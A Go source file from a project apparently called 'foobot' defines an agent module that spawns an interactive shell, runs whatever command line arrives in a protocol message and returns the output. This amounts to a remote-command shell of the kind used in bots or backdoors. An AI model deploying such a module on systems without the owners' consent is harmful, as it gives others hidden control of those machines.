package agent

import(
    "io"
    /* "os" */
    "os/exec"
    "strings"
	"fuzzywookie/foobot/log"
	"fuzzywookie/foobot/conf"
	"fuzzywookie/foobot/proto"
)

const PS1 = "FOOBOT"

type Shell struct {
    proc *exec.Cmd
    stdin io.WriteCloser
    stdout io.ReadCloser
    stderr io.ReadCloser
}

func NewShellModule() *Shell {
    return &Shell{}
}

func (sh *Shell) Start() {
    shell := conf.Get("bot.shell")

    /* os.Setenv("PS1", PS1) */

    proc := exec.Command(shell, "-i")
    /* proc.Env = os.Environ() */

    log.TRACE.Printf("New shell env: %s", proc.Env)

    stdin, err := proc.StdinPipe()
    if err != nil {
        log.ERROR.Printf("Error connecting shell stdin: %s", err)
        return
    }

    reader, writer := io.Pipe()
    proc.Stdout = writer
    proc.Stderr = writer

    proc.Start()
    log.TRACE.Printf("Started shell: %s", shell)

    sh.proc = proc
    sh.stdin = stdin
    sh.stdout = reader
    sh.stderr = reader

    pscmd := "export PS1=\"" + PS1 + "\"; echo -e '\\x63\\x68\\x65\\x63\\x6b'\n"
    sh.stdin.Write([]byte(pscmd))
    readBetween(sh.stdout, "", "check\n" + PS1)
}

func readBetween(r io.Reader, token1 string, token2 string) string {
    buf := make([]byte, 256)
    var outBuf []byte
    start := -1
    end := 0

    for {
        n, _ := r.Read(buf)
        end += n
        outBuf = append(outBuf, buf[:n]...)
        text := string(outBuf[:end])

        if start < 0 {
            start = strings.Index(text, token1)
        } else if strings.Contains(text, token2) {
            break
        }
    }

    /* log.TRACE.Printf("out: %s", string(outBuf[:end])) */

    end -= len(token2)
    return string(outBuf[start:end])
}

func (sh *Shell) Insert(line string) string {
    if sh.proc == nil {
        sh.Start()
    }

    sh.stdin.Write([]byte(line + "\n"))

    return readBetween(sh.stdout, "\n", PS1)
}

func (sh *Shell) Handle(msg *proto.Msg) string {
    rsp := sh.Insert(msg.Args)
    return rsp
}
